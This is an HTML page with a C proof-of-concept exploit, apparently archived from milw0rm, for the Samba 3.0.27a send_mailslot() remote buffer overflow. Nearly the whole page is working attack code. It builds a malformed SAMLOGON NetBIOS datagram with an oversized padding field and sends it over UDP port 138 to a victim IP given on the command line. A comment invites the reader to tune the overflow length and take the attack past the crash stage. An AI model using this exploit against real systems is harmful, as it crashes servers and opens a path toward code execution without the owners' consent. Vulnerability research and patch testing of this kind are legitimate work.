<html><head><title>Samba 3.0.27a send_mailslot() Remote Buffer Overflow PoC</title></head><pre>/* http://secunia.com/secunia_research/2007-99/advisory/
 *
 * A remote attacker could send a specially crafted &quot;SAMLOGON&quot; domain
 * logon packet, possibly leading to the execution of arbitrary code with
 * elevated privileges. Note that this vulnerability is exploitable only
 * when domain logon support is enabled in Samba.
 *
 * ///////
 *
 * Sample/simple POC [crash only] by a bored guy at asmx86 gmail [com], further exploitation or not.. is left as an exercise to the reader.
 *
 * laneleb &amp; petemir, a true love in this world! hi!
 *
 * kangaroo kangaroo...
 */

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;  
#include &lt;netdb.h&gt;  
#include &lt;netinet/in.h&gt;  
#include &lt;arpa/inet.h&gt;  
#include &lt;stdio.h&gt;  
#include &lt;stdlib.h&gt;  
#include &lt;string.h&gt;  
#include &lt;unistd.h&gt;  
#include &lt;assert.h&gt;
#include &lt;stdint.h&gt;

/* smb ripped defines/etc */

#define MAX_DGRAM_SIZE 576
#define MAX_NETBIOSNAME_LEN 16
typedef char nstring[MAX_NETBIOSNAME_LEN];
typedef char unstring[MAX_NETBIOSNAME_LEN*4];
enum node_type {B_NODE=0, P_NODE=1, M_NODE=2, NBDD_NODE=3};

#define PTR_DIFF(p1,p2) (/*(ptrdiff_t)*/(((const char *)(p1)) - (const char *)(p2)))

#define CVAL_NC(buf,pos) (((unsigned char *)(buf))[pos]) /* Non-const version of CVAL */
#define SSVALX(buf,pos,val) (CVAL_NC(buf,pos)=(unsigned char)((val)&amp;0xFF),CVAL_NC(buf,pos+1)=(unsigned char)((val)&gt;&gt;8))

#define SSVAL(buf,pos,val) SSVALX((buf),(pos),((uint16_t)(val)))
#define SCVAL(buf,pos,val) (CVAL_NC(buf,pos) = (val))

/* A netbios name structure. */
struct nmb_name {
	nstring      name;
	char         scope[64];
	unsigned int name_type;
};

void safe_strcpy(char *a, char *b, uint32_t size)
{
    strcpy(b, a);
}

void put_name(char *dest, const char *name, int pad, unsigned int name_type)
{
    size_t len = strlen(name);

    memcpy(dest, name, (len &lt; MAX_NETBIOSNAME_LEN) ? len : MAX_NETBIOSNAME_LEN - 1);
    if (len &lt; MAX_NETBIOSNAME_LEN - 1)
    {
        memset(dest + len, pad, MAX_NETBIOSNAME_LEN - 1 - len);
    }

    dest[MAX_NETBIOSNAME_LEN - 1] = name_type;
}

int put_nmb_name(char *buf,int offset,struct nmb_name *name)
{
    int ret,m;
    nstring buf1;
    char *p;

    if (strcmp(name-&gt;name,&quot;*&quot;) == 0)
    {
        /* special case for wildcard name */
        put_name(buf1, &quot;*&quot;, '\0', name-&gt;name_type);
    }
    else
    {
        put_name(buf1, name-&gt;name, ' ', name-&gt;name_type);
    }

    buf[offset] = 0x20;

    ret = 34;

    for (m=0;m&lt;MAX_NETBIOSNAME_LEN;m++)
    {
        buf[offset+1+2*m] = 'A' + ((buf1[m]&gt;&gt;4)&amp;0xF);
        buf[offset+2+2*m] = 'A' + (buf1[m]&amp;0xF);
    }
    offset += 33;

    buf[offset] = 0;

    if (name-&gt;scope[0])
    {
        /* XXXX this scope handling needs testing */
        ret += strlen(name-&gt;scope) + 1;
        safe_strcpy(&amp;buf[offset+1],name-&gt;scope,sizeof(name-&gt;scope));

        p = &amp;buf[offset+1];
        while ((p = strchr(p,'.')))
        {
            buf[offset] = PTR_DIFF(p,&amp;buf[offset+1]);
            offset += (buf[offset] + 1);
            p = &amp;buf[offset+1];
        }
        buf[offset] = strlen(&amp;buf[offset+1]);
    }

    return(ret);
}

typedef struct exudp_s
{
    unsigned char msg_type;
    unsigned char flags;
    uint16_t dgm_id;
    uint32_t source_ip;
    uint16_t source_port;
    uint16_t dgm_len;
    uint16_t pOffset;
    struct nmb_name source_name;
    struct nmb_name dest_name;
} exudp;

/* code */

int send_udp(int ip, char *packet, unsigned int packetSize)
{
    int fd;
    struct sockaddr_in to;
    int len;

    if( (fd = socket(AF_INET, SOCK_DGRAM, 0)) &lt; 0)
        return 0;

    to.sin_family      = AF_INET;
    to.sin_addr.s_addr = ip;
    to.sin_port        = htons(138);

    if( (len = sendto(fd, packet, packetSize, 0, (struct sockaddr *)&amp;to, sizeof(struct sockaddr_in))) &lt; 0)
    {
        perror(&quot;sendto&quot;);
        return 0;
    }

    return len;
}

int main(int argc, char *argv[])
{
    unsigned char samlogon[10240];
    unsigned int  nlOffset;
    exudp dgPacket;

    printf(&quot;smb_mailslot() POC by asmx86@gmail.com\n\n&quot;);

    if(argc &lt; 3)
    {
        printf(&quot;Usage: %s &lt;uppercase victim's netbios name&gt; &lt;victim's ip&gt;\n\n&quot;, argv[0]);
        exit(1);
    }

    if(strlen(argv[1]) &gt; 15)
    {
        printf(&quot;[!] netbios victim's name too long\n&quot;);
        exit(1);
    }

    memset(samlogon, 0, sizeof(samlogon));

    dgPacket.msg_type    = 0x11;
    dgPacket.flags       = 1;
    dgPacket.dgm_id      = 0xdead;
    dgPacket.source_ip   = 0xdeadbeef;
    dgPacket.source_port = 0xc0fe;
    dgPacket.dgm_len     = 0;
    dgPacket.pOffset     = 0;

    strcpy(dgPacket.source_name.name, &quot;ASMX86@GMAILCOM&quot;);
    strcpy(dgPacket.dest_name.name, argv[1]);

    nlOffset = 14;

    nlOffset += put_nmb_name((char *)&amp;samlogon, nlOffset, &amp;dgPacket.source_name);
    nlOffset += put_nmb_name((char *)&amp;samlogon, nlOffset, &amp;dgPacket.dest_name);

#define OFFSET 97

    nlOffset -= 4;
    SCVAL(samlogon, nlOffset+4, 0);
    SSVAL(samlogon, nlOffset+4+OFFSET, 18);
    SCVAL(samlogon, nlOffset+7, 0);
    SCVAL(samlogon, nlOffset+8, 0x25);
    SSVAL(samlogon, nlOffset+59, 397);

    SSVAL(samlogon, nlOffset+61, OFFSET);

    SSVAL(samlogon, nlOffset+63, 0);

    SSVAL(samlogon, nlOffset+36, 12);
    memcpy(&amp;samlogon[nlOffset+39+(12*2)], &quot;\\MAILSLOT\\NET\\NTLOGON&quot;, 21);

    memcpy(&amp;samlogon[nlOffset+4+OFFSET+4],     &quot;\x41\x00\x41\x00\x00\x00&quot;, 6);
    memcpy(&amp;samlogon[nlOffset+4+OFFSET+4+6-1], &quot;\x42\x00\x42\x00\x00\x00&quot;, 6);
    memset(&amp;samlogon[nlOffset+4+OFFSET+4+6+6], '\x43', 260);                   //play with this value ;)

    nlOffset = 576;

    dgPacket.dgm_len = nlOffset - 14;
    dgPacket.dgm_len = htons(dgPacket.dgm_len);

    memcpy(&amp;samlogon, &amp;dgPacket, 14);

    if(!send_udp(inet_addr(argv[2]), samlogon, nlOffset))
        fprintf(stderr, &quot;[!] Error sending UDP packet\n&quot;);
    else
        fprintf(stderr, &quot;[*] packet sent\n&quot;);

    return 0;
}
//eof

// milw0rm.com [2007-12-14]</pre></html>